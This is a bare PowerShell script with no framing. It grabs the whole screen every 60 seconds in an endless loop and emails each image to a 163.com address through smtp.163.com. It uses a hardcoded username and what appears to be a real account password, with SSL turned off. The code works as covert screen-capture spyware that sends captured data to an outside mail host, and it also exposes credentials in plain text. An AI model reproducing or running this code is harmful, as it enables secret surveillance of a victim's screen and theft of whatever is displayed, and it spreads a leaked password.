cd C:\
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = new-object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
}

$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 2560, 1440)
screenshot $bounds "C:\screenshot.png"

$Username = "nireinininomeru@163.com";
$Password = "IMWFGPCKHRGRCPXO";
$path = "C:\screenshot.png";
function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = "nireinininomeru@163.com";
    $message.To.Add($email);
    $message.Subject = "null";
    $message.Body = "null";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.163.com", "25");
    $smtp.EnableSSL = $false;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    write-host "MailSent" ; 
    $attachment.Dispose();
 }
Send-ToEmail  -email "nireinininomeru@163.com" -attachmentpath $path;

while ($true) {
    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 2560, 1440)

    screenshot $bounds "C:\screenshot.png"

    Send-ToEmail -email "nireinininomeru@163.com" -attachmentpath "C:\screenshot.png"

    Start-Sleep -s 60
}
param ($UserName, $Password, $Mail)
script.ps1 -UserName nireinininomeru@163.com -Password IMWFGPCKHRGRCPXO -Mail nireinininomeru@163.com